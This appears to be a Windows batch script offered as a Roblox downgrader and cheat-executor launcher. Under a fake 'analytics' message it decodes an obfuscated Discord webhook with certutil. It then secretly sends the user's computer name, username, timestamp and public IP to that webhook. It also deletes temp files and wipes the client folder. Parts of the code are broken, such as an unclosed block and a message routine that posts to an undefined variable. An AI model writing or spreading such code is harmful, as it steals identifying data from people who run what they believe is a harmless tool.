��
cls
@echo off
setlocal enabledelayedexpansion
:start
set sp=%programdata%\script
set ver=1.1
set /p clientpath=<!sp!\clientpath.txt
set /p execpath=<!sp!\execpath.txt
title roblox downgrader v%ver% ^| by chicken

echo loading..
echo finding dependencies..
curl >nul 2>&1
if %errorLevel%==2 ( echo found curl!
) else ( goto curl )
if not exist !sp! ( md !sp! )

echo sending some analytics.. this may take a second!
echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNjkyMTM0MTAxNzk4MDk3OC9scEVWNXlGNmlzQmY5akNHVnQ4S3BhTzR4SFNhc0Q4eFY1NEtUcEpsMHl1dFVXVUlkYXk1MUlqQy1sRVBnLUZzS1pvZw== >!sp!\hook.txt
certutil -decode !sp!\hook.txt !sp!\hookd.txt >nul
set /p hookd=<!sp!\hookd.txt
del !sp!\hook.txt !sp!\hookd.txt
for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set ip=%%i
curl -H "Content-Type: application/json" -d "{\"content\": \"current version: %ver%\npc name: %COMPUTERNAME%\nusername: %USERNAME%\ndate and time: !date! !time!\nip: %ip%\n--------------------------------\", \"embeds\": [], \"attachments\": []}" "!hookd!"

if not exist !sp!\clientpath.txt (
	echo.
	echo input the directory path, not the executable
	echo ex: C:\Users\chicken\AppData\Local\Bloxstrap\Roblox\Player
	echo.
	set /p clientpath="where is your roblox at? "
	echo !clientpath! >!sp!\clientpath.txt
)

if not exist !sp!\execpath.txt (
	echo.
	echo it doesn't seem you set up your executor path.
	echo input the executable, not the directory.
	echo ex: C:\Users\chicken\3D Objects\solara\Bootstrapper.exe
	set /p execpath="where is your executor at? "
	echo !execpath! >!sp!\execpath.txt

:menu
cls
echo what do you want to do?
echo r. restart script
echo w. wipe all script data
echo 0. exit
echo 1. start roblox
echo 2. downgrade roblox
echo 3. start executor
echo 4. send me a message
set /p script="choose an option: "
if %script%==r ( goto start
) else if %script%==w ( del /f /q /s !sp!\* & exit
) else if %script%==0 ( exit
) else if %script%==1 (
	start "" "!clientpath!\RobloxPlayerBeta.exe"
	del /s /f /q %tmp%\*
	del /s /f /q %homepath%\AppData\LocalLow\Intel\ShaderCache\*
) else if %script%==2 ( goto downgrade
) else if %script%==3 (
	start "" "!execpath!"
	del /s /f /q %tmp%\*
	del /s /f /q %homepath%\AppData\LocalLow\Intel\ShaderCache\*
) else if %script%==4 ( goto message
) else (
	echo invalid option!
	timeout /t 2 >nul
	goto menu
)
goto askexit
:downgrade
cls
echo ex: b71c150c7c1f40de
set /p hash="what roblox hash? "
start "" https://rdd.latte.to/?channel=LIVE^&binaryType=WindowsPlayer^&version=!hash!
echo save in current folder! (%~dp0)
echo click any key when done downloading..
pause >nul
del /f /q /s "!clientpath!"\*
powershell -command "Expand-Archive -Path '%~dp0' -DestinationPath '!clientpath!'"
goto askexit

:message
cls
echo please include something that i can contact you back with!
echo you can use \n for line breaks!
echo ex: hey\nthis is a new line!
echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNjkyMjM4ODY1MDM5Nzc5Ni9QOC1qWnYwS052M2tkeUVFMWw5LWROcnMzRlE4OVc0LWJYTUFMSk9XNWowcVotd3dpT2EtZVQzWFB6QWdnSFJid24wZQ== >!sp!\hook.txt
certutil -decode !sp!\hook.txt !sp!\hookd.txt >nul
set /p hookd=<!sp!\hookd.txt
del !sp!\hook.txt !sp!\hookd.txt
set /p msg="what would you like to say? "
curl -H "Content-Type: application/json" -d "{\"content\": \"!msg!\nauthor: %ip%\", \"embeds\": [], \"attachments\": []}" "!msgd!"
goto askexit
:askexit
echo.
set /p askexit="would you like to go to the menu? (y/n) "
if %askexit%==y ( goto menu
) else ( exit )
echo.
echo how'd you get here?
goto askexit
:curl
echo you need curl for this script.
set /p curl="would you like to install curl? (y/n) "
if %curl%==y ( winget install cURL.cURL & goto start
) else (
	echo ok.
	echo click any key to continue
	pause >nul
	exit
)
echo fard
endlocal